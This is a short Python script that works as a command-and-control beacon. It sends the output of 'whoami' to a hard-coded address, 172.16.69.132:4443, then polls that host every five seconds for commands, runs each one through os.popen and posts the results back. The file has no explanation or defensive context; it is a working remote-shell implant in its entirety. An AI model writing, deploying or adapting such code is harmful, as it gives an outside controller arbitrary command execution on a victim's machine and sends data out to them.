import os
import http.client
import time
import threading
from multiprocessing import Process
import http.client, urllib.parse


def first_time():
    first_connection = http.client.HTTPConnection('172.16.69.132:4443', timeout=10)
    results = (os.popen(str("whoami")).read())
    first_connection.request("POST", "", results)
    first_connection.close()


def callback():
    c2_connection = http.client.HTTPConnection('172.16.69.132:4443', timeout=10)
    c2_connection.request("GET", "/")
    cmd = c2_connection.getresponse().read().decode()
    if cmd:
        results = (os.popen(str(cmd)).read())
        c2_connection.request("POST", "", results)
        c2_connection.close()


first_time()


while 1:
    callback()
    time.sleep(5)

